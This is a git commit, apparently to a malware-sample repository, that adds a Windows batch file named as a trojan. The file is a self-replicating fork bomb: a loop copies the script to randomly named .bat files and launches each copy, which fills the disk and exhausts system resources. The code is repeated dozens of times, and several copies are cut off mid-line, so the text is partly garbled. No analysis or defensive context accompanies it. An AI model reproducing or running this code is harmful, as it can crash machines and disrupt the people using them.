b17bbf7001b4b77463587098c82f94c85b326fa7
Ethereal <etherealonthewifi@gmail.com>
2025-08-24 21:09:56 +0200

    Trojan drop

---
+++ Trojan/Uncategorized/Trojan.BAT.Bomb.f
@@ -0,0 +1,328 @@
+@echo off
+:A
+set x=%random%
+type %0 >> %x%.bat
+start %x%.bat
+goto:A
+@echo off
+:A
+set x=%random%
+type %0 >> %x%.bat
+start %x%.bat
+goto:A
+@echo off
+:A
+set x=%random%
+type %0 >> %x%.bat
+start %x%.bat
+goto:A
+@echo off
+:A
+set x=%random%
+type %0 >> %x%.bat
+start %x%.bat
+goto:A
+@echo off
+:A
+set x=%random%
+type %0 >> %x%.bat
+start %x%.bat
+goto:A
+@echo off
+:A
+set x=%random%
+type %0 >> %x%.bat
+start %x%.bat
+goto:A
+@echo off
+:A
+set x=%random%
+type %0 >> %x%.bat
+start %x%.bat
+goto:A
+@echo off
+:A
+set x=%random%
+type %0 >> %x%.bat
+start %x%.bat
+goto:A
+@echo off
+:A
+set x=%random%
+type %0 >> %x%.bat
+start %x%.bat
+goto:A
+@echo off
+:A
+set x=%random%
+type %0 >> %x%.bat
+start %x%.bat
+goto:A
+@echo off
+:A
+set x=%random%
+type %0 >> %x%.bat
+start %x%.bat
+goto:A
+@echo off
+:A
+set x=%random%
+type %0 >> %x%.bat
+start %x%.bat
+goto:A
+@echo off
+:A
+set x=%ra@echo off
+:A
+set x=%random%
+type %0 >> %x%.bat
+start %x%.bat
+goto:A
+@echo off
+:A
+set x=%random%
+type %0 >> %x%.bat
+start %x%.bat
+goto:A
+@echo off
+:A
+set x=%random%
+type %0 >> %x@echo off
+:A
+set x=%random%
+type %0 >> %x%.bat
+start %x%.bat
+goto:A
+@echo off
+:A
+set x=%random%
+type %0 >> %x%.bat
+start %x%.bat
+goto:A
+@echo off
+:A
+set x=%random%
+type %0 >> %x%.bat
+start %x%.bat
+goto:A
+@echo off
+:A
+set x=%random%
+type %0 >> %x%.bat
+start %x%.bat
+goto:A
+@echo off
+:A
+set x=%random%
+type %0 >> %x%.bat
+start %x%.bat
+goto:A
+@echo off
+:A
+set x=%random%
+type %0 >> %x%.bat
+start %x%.bat
+goto:A
+@echo off
+:A
+set x=%random%
+type %0 >> %x%.bat
+start %x%.bat
+goto:A
+@echo off
+:A
+set x=%random%
+type %0 >> %x%.bat
+start %x%.bat
+goto:A
+@echo off
+:A
+set x=%random%
+type %0 >> %x%.bat
+start %x%.bat
+goto:A
+@echo off
+:A
+set x=%random%
+type %0 >> %x%.bat
+start %x%.bat
+goto:A
+@echo off
+:A
+set x=%random%
+type %0 >> %x%.bat
+start %x%.bat
+goto:A
+@echo off
+:A
+set x=%random%
+type %0 >> %x%.bat
+start %x%.bat
+goto:A
+@echo off
+:A
+set x=%ra@echo off
+:A
+set x=%random%
+type %0 >> %x%.bat
+start %x%.bat
+goto:A
+@echo off
+:A
+set x=%random%
+type %0 >> %x%.bat
+start %x%.bat
+goto:A
+@echo off
+:A
+set x=%random%
+type %0 >> %x@echo off
+:A
+set x=%random%
+type %0 >> %x%.bat
+start %x%.bat
+goto:A
+@echo off
+:A
+set x=%random%
+type %0 >> %x%.bat
+start %x%.bat
+goto:A
+@echo off
+:A
+set x=%random%
+type %0 >> %x%.bat
+start %x%.bat
+goto:A
+@echo off
+:A
+set x=%random%
+type %0 >> %x%.bat
+start %x%.bat
+goto:A
+@echo off
+:A
+set x=%random%
+type %0 >> %x%.bat
+start %x%.bat
+goto:A
+@echo off
+:A
+set x=%random%
+type %0 >> %x%.bat
+start %x%.bat
+goto:A
+@echo off
+:A
+set x=%random%
+type %0 >> %x%.bat
+start %x%.bat
+goto:A
+@echo off
+:A
+set x=%random%
+type %0 >> %x%.bat
+start %x%.bat
+goto:A
+@echo off
+:A
+set x=%random%
+type %0 >> %x%.bat
+start %x%.bat
+goto:A
+@echo off
+:A
+set x=%random%
+type %0 >> %x%.bat
+start %x%.bat
+goto:A
+@echo off
+:A
+set x=%random%
+type %0 >> %x%.bat
+start %x%.bat
+goto:A
+@echo off
+:A
+set x=%random%
+type %0 >> %x%.bat
+start %x%.bat
+goto:A
+@echo off
+:A
+set x=%ra@echo off
+:A
+set x=%random%
+type %0 >> %x%.bat
+start %x%.bat
+goto:A
+@echo off
+:A
+set x=%random%
+type %0 >> %x%.bat
+start %x%.bat
+goto:A
+@echo off
+:A
+set x=%random%
+type %0 >> %x@echo off
+:A
+set x=%random%
+type %0 >> %x%.bat
+start %x%.bat
+goto:A
+@echo off
+:A
+set x=%random%
+type %0 >> %x%.bat
+start %x%.bat
+goto:A
+@echo off
+:@echo off
+:A
+set x=%random%
+type %0 >> %x%.bat
+start %x%.bat
+goto:A
+@echo off
+:A
+set x=%random%
+type %0 >> %x%.bat
+start %x%.bat
+goto:A
+@echo off
+:A
+set x=%random%
+type %0 >> %x%.bat
+start %x%.bat
+goto:A
+@echo off
+:A
+set x=%random%
+type %0 >> %x%.bat
+start %x%.bat
+goto:A
+@echo off
+:A
+set x=%random%
+type %0 >> %x%.bat
+start %x%.bat
+goto:A
+@echo off
+:A
+set x=%random%
+type %0 >> %x%.bat
+start %x%.bat
+goto:A
+@echo off
+:A
+set x=%random%
+type %0 >> %x%.bat
+start %x%.bat
+go@echo off
+:A
+set x=%random%
+type %0 >> %x%.bat
+start %x%.bat
+goto:A
+@echo 
